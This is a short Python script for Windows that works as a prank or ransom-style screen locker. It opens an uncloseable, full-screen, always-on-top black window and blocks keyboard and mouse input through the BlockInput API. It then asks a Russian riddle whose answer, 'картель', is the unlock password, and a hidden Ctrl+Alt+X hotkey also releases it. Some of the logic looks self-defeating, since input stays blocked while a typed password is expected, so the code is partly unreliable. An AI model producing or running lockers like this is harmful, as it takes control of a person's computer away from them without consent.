import tkinter as tk
import ctypes as c
import keyboard
import PyQt6



def block_input():
    c.windll.user32.BlockInput(True)

def unblock_input():
    c.windll.user32.BlockInput(False)


def lock():
    def unlock():
        if password.get() == "картель":
            unblock_input()
            root.destroy()
    def unlock_test():
        unblock_input()
        root.destroy()
    root=tk.Tk()
    root.attributes("-fullscreen",True)
    root.attributes("-topmost",True)
    root.protocol("WM_DELETE_WINDOW",lambda:None)
    root.configure(bg="black")
    label=tk.Label(root,text="Кто одно из самых великих существ во вселенной?\nКто же",fg="red",bg="black")
    label.pack(pady=20)
    block_input()
    password=tk.Entry(root,show="*")
    password.pack(pady=20)
    unlock_button=tk.Button(root,text="правильно или нет",command=unlock)
    unlock_button.pack()
    block_input()
    keyboard.add_hotkey("ctrl+alt+x",unlock_test)
    root.mainloop()
lock()